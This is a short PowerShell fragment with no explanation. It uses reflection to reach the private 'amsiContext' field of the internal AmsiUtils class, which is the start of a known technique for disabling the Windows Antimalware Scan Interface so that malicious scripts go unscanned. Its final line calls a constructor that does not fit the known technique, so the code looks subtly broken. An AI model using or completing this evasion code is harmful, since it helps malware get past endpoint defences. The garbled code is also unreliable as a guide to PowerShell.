$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiContext', [System.Reflection.BindingFlags]'Static,NonPublic')
$c = $b.GetValue($null)
$d = [System.Management.Automation.AmsiSession]::new($a, $c)
